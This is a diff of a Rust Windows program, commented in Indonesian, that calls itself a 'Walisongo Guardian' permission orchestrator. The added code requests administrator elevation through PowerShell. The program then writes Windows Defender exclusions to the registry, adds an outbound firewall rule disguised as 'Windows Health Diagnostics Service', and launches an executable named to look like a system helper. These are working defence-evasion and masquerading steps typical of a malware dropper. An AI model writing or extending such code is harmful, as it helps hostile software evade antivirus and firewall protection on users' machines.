@@ -7,17 +7,60 @@ use std::io::{self, Write};
 use winreg::enums::*;
 use winreg::RegKey;
 
-use config::config;
+// Asumsi konstanta ini ada di module config kamu
+// Jika tidak, definisikan di sini:
+const DATA_DIR: &str = "WalisongoGuardian";
+const EXE_NAME: &str = "WinSysHelper.exe";
+const CREATE_NO_WINDOW: u32 = 0x08000000;
+
+fn is_admin() -> bool {
+    // Mencoba membuka Registry HKLM dengan akses tulis. 
+    // Jika gagal, berarti kita bukan Admin.
+    RegKey::predef(HKEY_LOCAL_MACHINE)
+        .open_subkey_with_flags("SOFTWARE", KEY_READ | KEY_WRITE)
+        .is_ok()
+}
+
+fn relaunch_as_admin() -> io::Result<()> {
+    let exe_path = env::current_exe()?;
+    let exe_str = exe_path.to_str().unwrap_or("");
+
+    // Menggunakan PowerShell untuk men-trigger prompt "Run as Administrator"
+    let status = Command::new("powershell")
+        .args(&[
+            "Start-Process",
+            &format!("'{}'", exe_str),
+            "-Verb",
+            "RunAs",
+        ])
+        .status()?;
+
+    if status.success() {
+        std::process::exit(0); // Tutup proses yang tidak punya izin admin
+    }
+    Ok(())
+}
 
 fn apply_registry_exclusion(target_path: &str) -> std::io::Result<()> {
     let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
-    let path = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
+    // Gunakan double backslash atau raw strings
+    let path = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths";
     let (key, _) = hklm.create_subkey(path)?;
     key.set_value(target_path, &1u32)?; 
     Ok(())
 }
 
 fn main() {
+    // --- CEK ADMIN ---
+    if !is_admin() {
+        println!("[!] Program membutuhkan izin Administrator.");
+        println!("[*] Mencoba meminta elevasi hak akses...");
+        if let Err(_) = relaunch_as_admin() {
+            println!("[-] Gagal meminta izin Admin. Silakan klik kanan dan 'Run as Administrator'.");
+            return;
+        }
+    }
+
     println!("====================================================");
     println!("    WALISONGO GUARDIAN: PERMISSION ORCHESTRATOR     ");
     println!("====================================================");
@@ -32,43 +75,41 @@ fn main() {
         let _ = fs::create_dir_all(&target_path); 
     }
 
-    // 2. Registry Hardening (Non-Fatal)
+    // 2. Registry Hardening
     print!("[*] Menerapkan Registry Exclusion... ");
     io::stdout().flush().unwrap();
     if let Err(e) = apply_registry_exclusion(path_str) {
-        println!("\n[!] Gagal: {}. (Lanjut ke metode PowerShell)", e);
+        println!("\n[!] Gagal Registry: {}. (Lanjut ke PowerShell)", e);
     } else {
         println!("OK.");
     }
 
-    // 3. PowerShell Hardening (Metode Utama)
-    println!("[*] Mendaftarkan pengecualian perilaku ke Windows Defender...");
+    // 3. PowerShell Hardening
+    println!("[*] Mendaftarkan pengecualian ke Windows Defender...");
     execute_ps(&defender_policy_full(path_str));
 
     // 4. Firewall Configuration
-    println!("[*] Membuka jalur transmisi data (Firewall)...");
+    println!("[*] Membuka jalur Firewall...");
     let firewall_rules = format!(
         "netsh advfirewall firewall add rule name='Windows Health Diagnostics Service' \
          dir=out action=allow program='{}' enable=yes profile=any",
         full_exe_path.to_str().unwrap()
     );
-    let _ = Command::new("cmd").args(&["/C", &firewall_rules]).creation_flags(CREATE_NO_WINDOW).status();
+    let _ = Command::new("cmd")
+        .args(&["/C", &firewall_rules])
+        .creation_flags(CREATE_NO_WINDOW)
+        .status();
 
-    // 5. Memanggil Installer C++ (Halaman Instalasi)
-    println!("[*] Meluncurkan halaman instalasi Walisongo Guardian...");
-    
-    // Jangan gunakan argumen --background agar fungsi Install() muncul
-    // Gunakan spawn() tanpa CREATE_NO_WINDOW agar jendela installer muncul
+    // 5. Memanggil Installer C++
+    println!("[*] Meluncurkan installer...");
     let launch = Command::new("WinSysHelper.exe").spawn();
 
     if launch.is_ok() {
         println!("[SUCCESS] Installer berhasil dijalankan.");
-        println!("\nSilakan selesaikan proses instalasi pada jendela yang muncul.");
     } else {
         eprintln!("[-] ERROR: File 'WinSysHelper.exe' tidak ditemukan!");
     }
 
-    // 6. Mencegah program langsung tertutup agar user bisa membaca log
     println!("\nTekan Enter untuk keluar...");
     let mut temp = String::new();
     let _ = io::stdin().read_line(&mut temp);
